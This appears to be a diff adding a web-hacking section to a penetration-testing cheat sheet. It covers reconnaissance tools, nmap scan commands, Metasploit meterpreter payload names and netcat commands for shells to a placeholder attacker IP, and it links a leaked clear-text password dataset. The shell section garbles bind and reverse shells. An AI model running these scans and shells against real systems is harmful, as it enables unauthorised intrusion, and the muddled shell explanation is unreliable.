@@ -157,4 +157,81 @@ If RPC is open, we can login using rpclient.
 > $ rpcclient -U "" <HOST_IP>
 ```
 
+## Web Hacking
 
+### Five Stages of Web Hacking
+    * Reconnaissance
+    * Scanning and Enumeration
+    * Gaining Access
+    * Maintaining Access
+    * Covering Tracks
+
+### Enumeration and Reconnaissance Tools
+
+* Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
+* [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
+* [crt.sh](http://crt.sh) - Certificate enumeration tool.
+* [Hunter.io](https://hunter.io/) - Email enumeration tool.
+* Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
+* HaveIbeenPwned - Useful for breach enumeraton.
+* Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
+* Use Zap Proxy tool to extract hidden files/directories.
+* Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
+
+To gather information from online sources.
+
+```
+> $ theharvester -d microsoft.com -l 200 -g -b google
+```
+
+### Scanning
+
+Ping Sweep a network.
+
+```
+> $ nmap -sn <NETWORK>
+```
+
+SYN Scan with Speed of 4 and port of common 1000 TCP.
+
+```
+> $ nmap -T4 <NETWORK>
+```
+
+All Port scan with All Scanning including OS, Version, Script and Traceroute.
+
+```
+> $ nmap -T4 -A -p- <NETWORK>
+```
+
+To scan for UDP Ports (Dont scan all scans, as it takes lot of time).
+
+
+```
+> $ nmap -sU -T4 <NETWORK>
+```
+
+### Payloads
+
+Non Staged Payload Example.
+
+```
+windows/meterpreter_reverse_tcp
+```
+
+Staged Payload Example.
+
+```
+windows/meterpreter/reverse_tcp
+```
+
+### Shells
+
+To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen for connection.
+```
+> $ nc <ATTACKER_IP> <ATTACKET_PORT>` 
+```
+
+```
+> $ nc -lvp <ATTACKER_PORT>
+```
